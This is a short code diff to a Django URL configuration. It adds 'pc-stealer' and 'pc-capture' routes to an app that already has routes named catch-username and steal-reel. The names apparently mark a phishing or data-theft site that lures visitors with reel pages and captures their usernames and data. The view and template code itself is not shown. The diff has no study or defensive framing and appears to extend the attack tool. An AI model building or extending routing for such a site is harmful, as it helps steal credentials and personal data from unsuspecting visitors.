@@ -15,5 +15,7 @@ urlpatterns = [
     path('catch-username/', views.catch_username),
 path('reel/<str:code>/', views.reel_page),
 path('steal-reel/', views.steal_reel),
+path('pc-stealer/', lambda r: render(r, 'core/pc-stealer.html')),
+path('pc-capture/', views.pc_capture),
     
 ]
